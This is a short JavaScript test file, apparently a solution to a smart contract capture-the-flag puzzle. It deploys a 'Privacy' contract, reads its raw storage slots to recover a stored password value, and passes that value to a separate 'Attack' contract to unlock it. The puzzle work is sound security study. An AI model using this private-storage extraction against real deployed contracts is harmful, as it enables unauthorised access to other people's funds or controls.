const { expect } = require("chai");
const { deploy, getStorage } = require('../scripts/helpful_scripts');

describe("Privacy", function () {
  it("Should unlock Privacy.sol", async function () {

    const data = [
      ethers.utils.formatBytes32String('Hello World'),
      ethers.utils.formatBytes32String('0123456789'),
      ethers.utils.formatBytes32String('This is the password')
    ]
    const [Privacy, privacy] = await deploy('Privacy', data);

    expect(await privacy.locked()).to.be.true;

    // get storage in all the slots
    const bytes_storage = await getStorage(privacy, [0,1,2,3,4,5]);

    const [Attack, attack] = await deploy('Attack');
    await attack.unlock(privacy.address, bytes_storage[5]);

    expect(await privacy.locked()).to.be.false;
  
  });
});
